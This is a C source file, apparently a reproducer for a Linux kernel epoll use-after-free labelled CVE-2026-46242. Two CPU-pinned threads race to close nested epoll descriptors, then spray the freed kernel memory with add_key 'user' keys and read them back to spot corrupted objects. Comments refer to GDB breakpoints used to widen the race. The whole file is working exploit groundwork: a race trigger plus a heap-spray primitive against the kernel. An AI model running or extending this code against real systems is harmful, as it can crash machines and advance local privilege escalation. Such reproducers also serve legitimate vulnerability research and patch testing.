#define _GNU_SOURCE
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/epoll.h>
#include <sched.h>
#include <sys/syscall.h>
#include <stdint.h>
#include <string.h>
#include <errno.h>

int outer_epoll;
int inner_epoll;
volatile int sync_flag = 0;
volatile int loop_iteration = 0;

void *thread_a(void *arg) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(0, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    sync_flag = 1;
    close(outer_epoll);
    return NULL;
}

void *thread_b(void *arg) {
    cpu_set_t cpuset;
    CPU_ZERO(&cpuset);
    CPU_SET(1, &cpuset);
    pthread_setaffinity_np(pthread_self(), sizeof(cpu_set_t), &cpuset);
    
    // Wait for Thread A to be ready
    while (sync_flag == 0) { }
    
    // Sleep for 500ms to ensure Thread A reaches the GDB breakpoint and is patched to spin
    usleep(500000);
    
    close(inner_epoll);
    
    // Perform heap spray immediately after free
    char payload[128];
    memset(payload, 'A', sizeof(payload));
    for (int i = 0; i < 256; i++) {
        char desc[32];
        sprintf(desc, "uaf_test_%d_%d", loop_iteration, i);
        long ret = syscall(217, "user", desc, payload, 128, -2); // sys_add_key, KEY_SPEC_PROCESS_KEYRING
        if (ret < 0) {
            printf("[*] sys_add_key failed: ret=%ld, errno=%d\n", ret, errno);
        } else {
            printf("[*] sys_add_key success: id=%ld\n", ret);
        }
    }
    
    getpid(); // Signal to GDB that spray is done
    
    return NULL;
}

int main() {
    pthread_t ta, tb;
    struct epoll_event ev;
    
    printf("[*] Starting CVE-2026-46242 trigger-only reproducer loop...\n");
    printf("[*] Sleeping for 5 seconds to let GDB attach...\n");
    sleep(5);
    
    for (int i = 0; i < 10000; i++) {
        loop_iteration = i;
        sync_flag = 0;
        outer_epoll = epoll_create1(0);
        if (outer_epoll < 0) {
            perror("epoll_create1(outer)");
            break;
        }
        
        inner_epoll = epoll_create1(0);
        if (inner_epoll < 0) {
            perror("epoll_create1(inner)");
            close(outer_epoll);
            break;
        }
        
        ev.events = EPOLLIN;
        ev.data.fd = inner_epoll;
        
        if (epoll_ctl(outer_epoll, EPOLL_CTL_ADD, inner_epoll, &ev) < 0) {
            perror("epoll_ctl(ADD)");
            close(inner_epoll);
            close(outer_epoll);
            break;
        }
        
        pthread_create(&ta, NULL, thread_a, NULL);
        pthread_create(&tb, NULL, thread_b, NULL);
        
        pthread_join(ta, NULL);
        pthread_join(tb, NULL);
        
        // Read back the keys to verify corruption
        for (int k = 0; k < 32; k++) {
            char desc[32];
            sprintf(desc, "uaf_test_%d_%d", loop_iteration, k);
            long id = syscall(218, "user", desc, NULL, -2); // sys_request_key
            if (id > 0) {
                char buf[168];
                long ret = syscall(219, 11, id, buf, sizeof(buf)); // sys_keyctl, KEYCTL_READ
                if (ret > 0) {
                    uint64_t *val = (uint64_t *)&buf[136];
                    if (*val != 0x4141414141414141ULL) {
                        printf("[!] VICTIM FOUND! Payload at 136 is 0x%llx in key %d\n", (unsigned long long)*val, k);
                    }
                }
                syscall(219, 3, id); // sys_keyctl, KEYCTL_REVOKE
            }
        }
    }
    
    printf("[*] Reproducer loop finished.\n");
    return 0;
}
